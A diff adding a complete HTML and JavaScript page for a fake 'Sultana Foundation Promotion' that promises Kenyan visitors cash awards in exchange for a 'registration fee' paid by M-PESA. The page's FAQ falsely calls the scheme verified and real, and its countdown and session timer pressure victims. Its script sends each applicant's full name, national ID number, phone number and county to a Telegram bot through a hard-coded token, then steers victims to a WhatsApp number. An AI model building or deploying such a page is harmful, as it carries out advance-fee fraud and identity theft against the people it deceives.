@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sultana Foundation Promotion</title>
+
+<style>
+body{font-family:Arial,sans-serif;background:#f4f6f8;margin:0}
+#sumAward {
+  color: #0a7d32;
+  font-weight: bold;
+}
+#sumRef {
+  font-weight: bold;
+  color: #6a1b9a;
+}
+.container{max-width:500px;margin:30px auto;background:#fff;padding:25px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.12);position:relative}
+.hidden{display:none}
+label{display:block;margin-top:15px;font-weight:bold}
+input,select,textarea,button{width:100%;padding:12px;margin-top:8px;border-radius:8px;border:1px solid #ccc;font-size:15px}
+button{background:#0a4da3;color:#fff;border:none;margin-top:20px;font-weight:bold;cursor:pointer}
+button:disabled{background:#9bb3d3;cursor:not-allowed}
+.copy-btn{background:#28a745}
+
+.watermark{
+position:absolute;top:45%;left:50%;
+transform:translate(-50%,-50%);
+font-size:40px;opacity:.05
+}
+
+.footer-note{text-align:center;margin-top:15px;color:#28a745;font-weight:bold}
+
+.instant{
+background:#e8f5e9;padding:10px;border-radius:8px;
+text-align:center;color:#1b5e20;font-weight:bold;margin:12px 0
+}
+
+.header{
+background:linear-gradient(135deg,#0a4da3,#1e88e5);
+padding:20px;border-radius:10px;color:#fff;text-align:center
+}
+.header h1{margin:0;font-size:28px}
+.header h2{margin-top:6px;font-size:15px;font-weight:normal}
+
+.verified{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+  background:#e8f7ee;
+  color:#1e7e34;
+  font-size:12px;
+  font-weight:600;
+  padding:3px 8px;
+  border-radius:16px;
+  margin-bottom:6px;
+  animation:pulse 1.8s infinite;
+}
+
+@keyframes pulse{
+  0%{transform:scale(1)}
+  50%{transform:scale(1.05)}
+  100%{transform:scale(1)}
+}
+/* Highlight Select Award */
+.highlight-award{
+border:2px solid #1e88e5;
+background:#e3f2fd;
+animation:glow 1.5s infinite;
+}
+@keyframes glow{
+0%{box-shadow:0 0 0 0 rgba(30,136,229,.5)}
+70%{box-shadow:0 0 0 12px rgba(30,136,229,0)}
+100%{box-shadow:0 0 0 0 rgba(30,136,229,0)}
+}
+
+.faq{
+margin-top:20px;background:#f9fbff;
+padding:15px;border-radius:10px;border-left:5px solid #0a4da3
+}
+.faq details{margin-top:10px}
+.faq summary{font-weight:bold;cursor:pointer}
+
+.fee-box{
+margin-top:12px;padding:14px;border-radius:10px;
+background:linear-gradient(135deg,#e3f2fd,#f1f8ff);
+border-left:6px solid #1e88e5;font-weight:bold;
+display:flex;align-items:center;gap:8px
+}
+.fee-box span{
+background:#1e88e5;color:#fff;
+padding:4px 10px;border-radius:20px;font-size:13px
+}
+
+.payment-box{
+background:#eef3ff;padding:16px;border-radius:10px;
+margin-top:20px;border-left:5px solid #0a4da3
+}
+
+.info-box{
+margin-top:12px;
+padding:14px;
+background:#f0f9ff;
+border-radius:10px;
+border-left:5px solid #1e88e5;
+font-size:14px;
+color:#0a2f5a
+}
+
+#livePopup{
+position:fixed;top:12px;left:50%;
+transform:translateX(-50%);
+background:#0a4da3;color:#fff;
+padding:6px 12px;border-radius:7px;
+font-size:12px;display:none;z-index:9999
+}
+
+.global-footer{
+position:fixed;bottom:6px;left:50%;
+transform:translateX(-50%);
+font-size:12px;color:#6aa84f;
+font-weight:bold;opacity:.9
+}
+
+.verify-box{text-align:center}
+.spinner{
+width:50px;height:50px;border:6px solid #ddd;
+border-top:6px solid #0a4da3;border-radius:50%;
+margin:20px auto;animation:spin 1s linear infinite
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.timer{
+background:#fff3cd;padding:10px;border-radius:8px;
+border-left:4px solid #ffc107;font-weight:bold;margin-bottom:15px
+}
+/* FIX SELECT NOT OPENING IMMEDIATELY */
+select {
+  position: relative;
+  z-index: 999;
+  background: #fff;
+  touch-action: manipulation;
+}
+.tv-runner{
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  overflow: hidden;
+  background: linear-gradient(90deg,#0a4da3,#1e88e5);
+  color: #fff;
+  z-index: 9999;
+  padding: 8px 0;
+}
+
+.tv-text{
+  display: inline-block;
+  white-space: nowrap;
+  padding-left: 100%;
+  font-weight: bold;
+  font-size: 14px;
+  animation: tvScroll 18s linear infinite;
+}
+
+.tv-text span{
+  color: #ffeb3b;
+}
+
+@keyframes tvScroll{
+  0%{ transform: translateX(0); }
+  100%{ transform: translateX(-100%); }
+}
+/* TV Channel color animation */
+.color-cycle{
+  animation: colorShift 1.8s infinite;
+  font-weight: bold;
+}
+
+@keyframes colorShift{
+  0%{color:#ff9800;}
+  25%{color:#4caf50;}
+  50%{color:#2196f3;}
+  75%{color:#9c27b0;}
+  100%{color:#ff9800;}
+}
+</style>
+</head>
+
+<body>
+<div class="tv-runner hidden" id="tvRunner">
+  <div class="tv-text">
+    🎉 Congratulations <span id="applicantName"></span> –
+    You have qualified for  <span id="awardAmount"></span>.
+    Proceed to complete your registration.
+  </div>
+</div>
+<!-- PAGE 1 -->
+<div class="container" id="page1">
+<div class="watermark">SULTANA FOUNDATION</div>
+
+<div class="header">
+<h1>SULTANA FOUNDATION PROMOTION</h1>
+<h2>@Official Program 2026</h2>
+<div class="verified">✅ Verified Official Program</div>
+</div>
+
+<div class="instant">🚀⚡ Instant approval & immediate disbursement</div>
+
+<label>📌 Where did you hear about this promotion?</label>
+<select id="source" onchange="showSource();validatePage1()">
+<option value="">-- Select --</option>
+<option>📻 Radio</option>
+<option>🖥️ TV</option>
+<option>👤 Friend</option>
+</select>
+
+<div id="radioBox" class="hidden">
+<label>Radio Station</label>
+<input id="radioInput" oninput="validatePage1()">
+</div>
+
+<div id="tvBox" class="hidden">
+<label>TV Channel</label>
+<input id="tvInput" class="color-cycle" oninput="validatePage1()">
+</div>
+
+<div id="friendBox" class="hidden">
+<label>Friend’s Name</label>
+<input id="friendInput" oninput="validatePage1()">
+</div>
+
+<div class="faq">
+<h3>❓ Frequently Asked Questions</h3>
+<details><summary>Is this promotion real?</summary><p>Yes. This is a verified and approved program.</p></details>
+<details><summary>How fast is approval?</summary><p>Approval is instant after verification.</p></details>
+<details><summary>Is payment secure?</summary><p>Yes. All payments are encrypted and monitored.</p></details>
+</div>
+
+<button id="nextBtn" disabled onclick="goPage2()">Next</button>
+<div class="footer-note">✔ Fast • Secure • Trusted</div>
+</div>
+
+<!-- PAGE 2 -->
+<div class="container hidden" id="page2">
+<div class="instant">🚀⚡ Verification in progress — instant approval</div>
+
+<label>Have you ever received any promotion, donation or award from Royal Media Services or Sultana Foundation?</label>
+<select id="received" onchange="validatePage2()">
+<option value="">-- Select --</option>
+<option>❌ No, never received</option>
+<option>✅ Yes, received before</option>
+</select>
+
+<button id="page2Btn" disabled onclick="goPage3()">Proceed</button>
+
+<!-- TERMS & CONDITIONS (ADDED BELOW PAGE 2) -->
+<div class="faq" style="margin-top:25px">
+<h3>📜 Terms & Conditions</h3>
+<details>
+<summary>Eligibility</summary>
+<p>This promotion is open to eligible Kenyan residents who complete the application honestly and accurately.</p>
+</details>
+<details>
+<summary>Registration Fee</summary>
+<p>The registration fee covers verification, system activation, fraud prevention, and secure processing.</p>
+</details>
+<details>
+<summary>Disbursement</summary>
+<p>Funds are disbursed only after successful verification and confirmation of valid payment.</p>
+</details>
+<details>
+<summary>Fraud Policy</summary>
+<p>Fake, edited, or forwarded M-PESA messages lead to automatic disqualification.</p>
+</details>
+</div>
+</div>
+
+<!-- PAGE 3 -->
+<div class="container hidden" id="page3">
+<div class="instant">🚀⚡ Approved applicants receive funds instantly</div>
+
+<label>💰 Select Award</label>
+<select id="award" class="highlight-award" onchange="updateFee();validatePage3()">
+<option value="">-- Select --</option>
+<option>Ksh 35,000</option>
+<option>Ksh 55,000</option>
+<option>Ksh 75,000</option>
+<option>Ksh 95,000</option>
+<option>Ksh 125,000</option>
+</select>
+
+<div id="feeText" class="fee-box hidden">
+💳 Registration Fee <span id="feeAmount"></span>
+</div>
+
+<div class="info-box">
+🎯 <b>Purpose of Registration</b><br>
+This registration supports applicant verification, fraud prevention,
+secure system activation, and transparent processing of approved awards.
+</div>
+
+<label>Full Name</label><input id="fullName" oninput="validatePage3()">
+<label>ID Number</label><input id="idNumber" oninput="validatePage3()">
+<label>Phone Number</label><input id="phoneNumber" oninput="validatePage3()">
+
+<label>County</label>
+<select id="county" onchange="validatePage3()">
+<option value="">-- Select County --</option>
+<option>Baringo</option><option>Bomet</option><option>Bungoma</option>
+<option>Busia</option><option>Elgeyo-Marakwet</option><option>Embu</option>
+<option>Garissa</option><option>Homa Bay</option><option>Isiolo</option>
+<option>Kajiado</option><option>Kakamega</option><option>Kericho</option>
+<option>Kiambu</option><option>Kilifi</option><option>Kirinyaga</option>
+<option>Kisii</option><option>Kisumu</option><option>Kitui</option>
+<option>Kwale</option><option>Laikipia</option><option>Lamu</option>
+<option>Machakos</option><option>Makueni</option><option>Mandera</option>
+<option>Marsabit</option><option>Meru</option><option>Migori</option>
+<option>Mombasa</option><option>Murang’a</option><option>Nairobi</option>
+<option>Nakuru</option><option>Nandi</option><option>Narok</option>
+<option>Nyamira</option><option>Nyandarua</option><option>Nyeri</option>
+<option>Samburu</option><option>Siaya</option><option>Taita Taveta</option>
+<option>Tana River</option><option>Tharaka Nithi</option>
+<option>Trans Nzoia</option><option>Turkana</option>
+<option>Uasin Gishu</option><option>Vihiga</option>
+<option>Wajir</option><option>West Pokot</option>
+</select>
+
+<button id="submitBtn" disabled onclick="goVerify()">Submit Application</button>
+</div>
+
+<!-- VERIFICATION -->
+<div class="container hidden" id="verifyPage">
+<div class="verify-box">
+<h2>🔍 Verifying Your Application</h2>
+<div class="spinner"></div>
+<p><b>Countdown: <span id="countdown">10</span> seconds</b></p>
+</div>
+</div>
+
+<!-- PAYMENT -->
+<div class="container hidden" id="success">
+<div class="tv-runner hidden" id="tvRunner">
+  <div class="tv-text" id="tvText">
+    🎉 Congratulations <span id="applicantName"></span>! You have qualified for  <span id="awardAmount"></span>. Proceed to complete your registration to secure your award and payment processing.
+  </div>
+</div>
+<h3>🎉 Verification Successful✅</h3>
+
+<div class="timer">
+⏳ Session expires in <span id="sessionTime">20:00</span>
+</div>
+
+<div class="instant">
+⚡ Disbursement is completed <b>within 5 minutes</b>
+after registration is successfully verified.
+</div>
+
+<div class="info-box">
+  <p style="font-weight:bold; color:#0a4da3; margin-bottom:6px;">
+🎉 APPLICATION STATUS UPDATED
+</p>
+  <p><b>Dear <span id="sumName"></span>,</b></p>
+
+  <p>
+    Your application for the
+    <b><span id="sumAward"></span></b>
+    has been successfully reviewed and approved.
+  </p>
+
+  <p>
+    Your application has now entered the final processing stage.
+    Kindly proceed to complete the award withdrawal.
+  </p>
+
+  <p style="font-weight:bold;color:#6a1b9a">
+    Reference Number: <span id="sumRef"></span>
+  </p>
+</div><!-- APPLICATION SUMMARY (ONLY ADDITION) -->
+
+<div id="mpesaNotice" style="
+display:none;
+background:#fffbe6;
+border:1px solid #f0c36d;
+padding:12px;
+border-radius:8px;
+color:#5a4b00;
+font-size:14px;
+margin-bottom:12px;
+">
+<b>ℹ️ Almost there!</b><br>
+Dear <b id="noticeName">Applicant</b>,  
+we’re ready to release your award. Kindly paste your
+<b>M-PESA confirmation SMS</b> so we can validate your payment
+and proceed with withdrawal.
+</div>
+<button
+  style="background:#25D366;font-size:16px"
+  onclick="proceedToWhatsApp()">
+📲 Proceed to Receive Your Award
+</button>
+</div>
+
+<div id="livePopup">✅ Application portal active — proceed to apply</div>
+<div class="global-footer">© @sultana promotion 2026</div>
+
+<script>
+window.onload=function(){
+  livePopup.style.display='block';
+  setTimeout(()=>livePopup.style.display='none',4000);
+}
+
+function showSource(){
+  radioBox.classList.add('hidden');
+  tvBox.classList.add('hidden');
+  friendBox.classList.add('hidden');
+  if(source.value.includes('Radio')) radioBox.classList.remove('hidden');
+  if(source.value.includes('TV')) tvBox.classList.remove('hidden');
+  if(source.value.includes('Friend')) friendBox.classList.remove('hidden');
+}
+
+function validatePage1(){
+  let ok=false;
+  if(source.value.includes('Radio')) ok=radioInput.value.trim().length>=2;
+  if(source.value.includes('TV')) ok=tvInput.value.trim().length>=2;
+  if(source.value.includes('Friend')) ok=friendInput.value.trim().length>=2;
+  nextBtn.disabled=!ok;
+}
+
+function goPage2(){page1.classList.add('hidden');page2.classList.remove('hidden')}
+function validatePage2(){page2Btn.disabled=received.value==='' }
+function goPage3(){page2.classList.add('hidden');page3.classList.remove('hidden')}
+
+function updateFee(){
+  const f={
+    "Ksh 35,000":"Ksh 599",
+    "Ksh 55,000":"Ksh 899",
+    "Ksh 75,000":"Ksh 1,299",
+    "Ksh 95,000":"Ksh 1,899",
+    "Ksh 125,000":"Ksh 2,599"
+  };
+  if(award.value){
+    feeAmount.innerText=f[award.value];
+    feeText.classList.remove('hidden');
+  }
+}
+
+function validatePage3(){
+  submitBtn.disabled=![award,fullName,idNumber,phoneNumber,county].every(i=>i.value.trim());
+}
+
+function goVerify(){
+  page3.classList.add('hidden');
+  verifyPage.classList.remove('hidden');
+  sendToTelegram();
+  let c=10;countdown.innerText=c;
+  const t=setInterval(()=>{
+    c--;countdown.innerText=c;
+    if(c===0){
+      clearInterval(t);
+      verifyPage.classList.add('hidden');
+      success.classList.remove('hidden');// SHOW APPLICATION SUMMARY
+      document.getElementById('tvRunner').classList.remove('hidden');
+document.getElementById('sumName').innerText =
+document.getElementById('fullName').value;
+
+document.getElementById('sumAward').innerText =
+  document.getElementById('award').value;
+document.getElementById('sumRef').innerText =
+  'SF-' + Math.floor(100000 + Math.random() * 900000);
+
+document.getElementById('appSummary').style.display = 'block';
+// SAVE DATA FOR SUCCESS PAGE
+localStorage.setItem(
+  "applicantName",
+  document.getElementById("fullName").value
+);
+
+localStorage.setItem(
+  "awardAmount",
+  document.getElementById("award").value
+);
+// SHOW DATA IN PAYMENT //SUMMARY
+document.getElementById("applicantName").innerText =
+  document.getElementById("fullName").value;
+
+document.getElementById("awardAmount").innerText =
+  document.getElementById("award").value;
+      startSession();
+    }
+  },1000);
+}
+
+function startSession(){
+  let s=1200;
+  setInterval(()=>{
+    if(s<=0)location.reload();
+    sessionTime.innerText=
+      String(Math.floor(s/60)).padStart(2,'0')+':'+
+      String(s%60).padStart(2,'0');
+    s--;
+  },1000);
+}
+function validateMpesa(){
+  const msg = mpesaMsg.value;
+
+  const text = msg.toLowerCase();
+
+const hasAmount = text.includes("ksh") || text.includes("kes");
+const hasMpesa = text.includes("m-pesa") || text.includes("mpesa");
+const hasCode = /[a-z0-9]{6,}/i.test(text);
+
+const ok = hasAmount && hasMpesa && hasCode;
+
+  mpesaStatus.innerText = ok
+    ? '✅ Valid M-PESA message detected'
+    : '❌ Invalid or fake message';
+
+  waBtn.disabled = !ok;
+}
+
+function sendWhatsApp() {
+  const mpesaText = document.getElementById("mpesaMsg").value.trim();
+const notice = document.getElementById("mpesaNotice");
+const name = document.getElementById("sumName").innerText;
+
+if (mpesaText === "") {
+  notice.style.display = "block";
+  notice.innerHTML = `
+    <b>ℹ️ Almost there!</b><br>
+    Dear <b>${name}</b>, we’re ready to release your award.
+    Kindly paste your <b>M-PESA confirmation SMS</b>
+    so we can validate your payment and proceed with withdrawal.
+  `;
+  return; // STOP here
+}
+
+notice.style.display = "none";
+
+// proceed to WhatsApp
+const amount = "Ksh 35,000";
+const ref = "SF-762843";
+
+const msg =
+  "WITHDRAW AWARD REQUEST%0A%0A" +
+  "Name: " + name + "%0A" +
+  "Amount: " + amount + "%0A" +
+  "Reference: " + ref;
+
+window.open(
+  "https://wa.me/254756296341?text=" + msg,
+  "_blank"
+);
+}
+// ===== TELEGRAM SETTINGS =====
+const TELEGRAM_BOT_TOKEN = "8562997371:AAHcnd1NreYy9yZYlcIMg-03ovHQEJ6kW18";
+const TELEGRAM_CHAT_ID = "8454296462";
+
+// SEND APPLICATION TO TELEGRAM
+function sendToTelegram() {
+  const message =
+    "📝 NEW APPLICATION\n\n" +
+    "👤 Name: " + fullName.value + "\n" +
+    "🆔 ID: " + idNumber.value + "\n" +
+    "📞 Phone: " + phoneNumber.value + "\n" +
+    "📍 County: " + county.value + "\n" +
+    "🎓 Award: " + award.value + "\n";
+
+  fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message
+    })
+  });
+}
+// ===== TV RUNNER DATA =====
+
+const storedName = localStorage.getItem("applicantName");
+const storedAmount = localStorage.getItem("awardAmount");
+
+document.addEventListener("DOMContentLoaded", function () {
+  if (document.getElementById("applicantName")) {
+    document.getElementById("applicantName").textContent =
+      storedName ? storedName : "Applicant";
+  }
+
+  if (document.getElementById("awardAmount")) {
+    document.getElementById("awardAmount").textContent =
+      storedAmount ? storedAmount : "35,000";
+  }
+});
+
+    if (document.getElementById("sumName")) {
+  document.getElementById("sumName").textContent =
+    localStorage.getItem("applicantName") || "";
+}
+
+  if (document.getElementById("sumAward")) {
+    document.getElementById("sumAward").textContent =
+      localStorage.getItem("awardApplied") || "";
+  }
+  function proceedToWhatsApp() {
+  const name = document.getElementById("sumName").innerText;
+  const award = document.getElementById("sumAward").innerText;
+  const ref = document.getElementById("sumRef").innerText;
+
+  const msg =
+    "AWARD WITHDRAWAL REQUEST%0A%0A" +
+    "Name: " + name + "%0A" +
+    "Award: " + award + "%0A" +
+    "Reference: " + ref + "%0A%0A" +
+    "My application has been approved and I would like guidance on receiving my award.";
+
+  window.open(
+    "https://wa.me/254756296341?text=" + msg,
+    "_blank"
+  );
+}
+</script>
+
+</body>
+</html>
